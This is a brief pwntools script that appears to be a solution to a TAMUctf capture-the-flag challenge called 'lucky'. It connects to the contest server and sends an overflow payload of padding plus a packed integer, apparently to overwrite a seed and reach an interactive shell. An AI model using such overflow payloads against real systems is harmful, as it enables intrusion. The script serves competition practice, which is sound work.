from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="lucky") 

seed = 0

p.sendlineafter("name:", b'A'*12 + p32(5649426))
print(p.recvline())


p.interactive()
